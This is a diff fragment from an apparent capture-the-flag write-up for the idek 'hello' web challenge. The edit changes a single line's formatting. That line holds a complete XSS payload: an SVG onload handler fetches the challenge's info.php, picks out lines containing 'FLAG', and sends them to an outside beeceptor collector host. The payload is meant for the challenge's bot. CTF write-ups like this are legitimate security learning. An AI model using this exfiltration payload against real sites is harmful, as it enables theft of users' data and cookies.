@@ -56,7 +56,7 @@ fetch(window.location.href.substring(0, 7) + "idek-hello.chal.idek.team:1337" + 
 ```
 becomes 
 
-`http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=fetch(window.location.href.substring(0, 7)%2b"idek-hello.chal.idek.team:1337"%2bwindow.location.href.substring(5,6)%2b"info.php"%2bwindow.location.href.substring(5,6)%2b"index.php").then(function(response){response.text().then(function(txt){txt.split(`\n`).forEach(function(line){if(line.indexOf("FLAG")!=-1){fetch(window.location.href.substring(0, 7)%2b"mymockserver123456.free.beeceptor.com"%2bwindow.location.href.substring(5,6)%2b"cookies?resp="%2bline)}})})})>`
+```http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=fetch(window.location.href.substring(0, 7)%2b"idek-hello.chal.idek.team:1337"%2bwindow.location.href.substring(5,6)%2b"info.php"%2bwindow.location.href.substring(5,6)%2b"index.php").then(function(response){response.text().then(function(txt){txt.split(`\n`).forEach(function(line){if(line.indexOf("FLAG")!=-1){fetch(window.location.href.substring(0, 7)%2b"mymockserver123456.free.beeceptor.com"%2bwindow.location.href.substring(5,6)%2b"cookies?resp="%2bline)}})})})>```
 which is sent to the bot.
 
 # Crator
